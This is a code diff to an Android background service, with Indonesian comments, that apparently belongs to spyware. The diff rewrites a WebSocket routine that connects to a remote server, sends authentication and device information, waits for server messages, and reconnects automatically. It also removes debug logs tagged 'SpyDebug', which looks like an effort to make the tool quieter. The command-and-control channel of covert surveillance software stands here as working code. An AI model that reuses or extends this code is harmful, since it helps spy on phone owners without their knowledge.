@@ -266,94 +266,73 @@ public class BackgroundService extends Service {
         } catch (SecurityException e) {} catch (Exception e) {}
     }
     
-private void connectWebSocket() {
-    try {
-        // ========== LOG DEBUGGING ==========
-        android.util.Log.e("SpyDebug", "========================================");
-        android.util.Log.e("SpyDebug", "WebSocket URL: " + Config.WS_URL);
-        android.util.Log.e("SpyDebug", "Username: " + username);
-        android.util.Log.e("SpyDebug", "Device ID: " + deviceId);
-        android.util.Log.e("SpyDebug", "========================================");
-        
-        // ✅ VALIDASI URL JANGAN SAMPAI NULL
-        if (Config.WS_URL == null || Config.WS_URL.isEmpty()) {
-            android.util.Log.e("SpyDebug", "❌ FATAL: WebSocket URL kosong/null!");
-            reconnect();
-            return;
+    private void connectWebSocket() {
+        try {
+            OkHttpClient client = new OkHttpClient.Builder()
+                .pingInterval(5, TimeUnit.SECONDS)
+                .connectTimeout(10, TimeUnit.SECONDS)
+                .readTimeout(10, TimeUnit.SECONDS)
+                .writeTimeout(10, TimeUnit.SECONDS)
+                .retryOnConnectionFailure(true)
+                .build();
+            
+            // Sisipkan username ke dalam URL saat koneksi pertama kali (handshake)
+            String finalWsUrl = Config.WS_URL + "?username=" + username;
+            
+            Request request = new Request.Builder()
+                .url(finalWsUrl)
+                .build();
+            
+            webSocket = client.newWebSocket(request, new WebSocketListener() {
+                @Override
+                public void onOpen(WebSocket webSocket, Response response) {
+                    isConnected = true;
+                    reconnectAttempts = 0;
+                    sendAuth();
+                    backgroundHandler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            sendDeviceInfo();
+                        }
+                    }, 1000);
+                }
+                
+                @Override
+                public void onMessage(WebSocket webSocket, String text) {
+                    handleWebSocketMessage(text);
+                }
+                
+                @Override
+                public void onClosed(WebSocket webSocket, int code, String reason) {
+                    isConnected = false;
+                    backgroundHandler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            reconnect();
+                        }
+                    }, 5000);
+                }
+                
+                @Override
+                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
+                    isConnected = false;
+                    backgroundHandler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            reconnect();
+                        }
+                    }, 5000);
+                }
+            });
+        } catch (Exception e) {
+            backgroundHandler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    reconnect();
+                }
+            }, 5000);
         }
-        
-        OkHttpClient client = new OkHttpClient.Builder()
-            .pingInterval(5, TimeUnit.SECONDS)
-            .connectTimeout(10, TimeUnit.SECONDS)
-            .readTimeout(10, TimeUnit.SECONDS)
-            .writeTimeout(10, TimeUnit.SECONDS)
-            .retryOnConnectionFailure(true)
-            .build();
-        
-        Request request = new Request.Builder()
-            .url(Config.WS_URL)
-            .build();
-        
-        android.util.Log.e("SpyDebug", "🔄 Mencoba koneksi WebSocket...");
-        
-        webSocket = client.newWebSocket(request, new WebSocketListener() {
-            @Override
-            public void onOpen(WebSocket webSocket, Response response) {
-                android.util.Log.e("SpyDebug", "✅ WebSocket CONNECTED! Response: " + (response != null ? response.code() : "null"));
-                isConnected = true;
-                reconnectAttempts = 0;
-                sendAuth();
-                backgroundHandler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        sendDeviceInfo();
-                    }
-                }, 1000);
-            }
-            
-            @Override
-            public void onMessage(WebSocket webSocket, String text) {
-                android.util.Log.e("SpyDebug", "📩 Message received: " + text.substring(0, Math.min(100, text.length())));
-                handleWebSocketMessage(text);
-            }
-            
-            @Override
-            public void onClosed(WebSocket webSocket, int code, String reason) {
-                android.util.Log.e("SpyDebug", "❌ WebSocket CLOSED - Code: " + code + ", Reason: " + reason);
-                isConnected = false;
-                backgroundHandler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        reconnect();
-                    }
-                }, 5000);
-            }
-            
-            @Override
-            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
-                android.util.Log.e("SpyDebug", "❌ WebSocket FAILED: " + t.getMessage());
-                android.util.Log.e("SpyDebug", "❌ Response: " + (response != null ? response.code() + " " + response.message() : "null"));
-                t.printStackTrace();
-                isConnected = false;
-                backgroundHandler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        reconnect();
-                    }
-                }, 5000);
-            }
-        });
-    } catch (Exception e) {
-        android.util.Log.e("SpyDebug", "❌ WebSocket EXCEPTION: " + e.getMessage());
-        e.printStackTrace();
-        backgroundHandler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                reconnect();
-            }
-        }, 5000);
     }
-}
     
     private void handleWebSocketMessage(String text) {
         try {
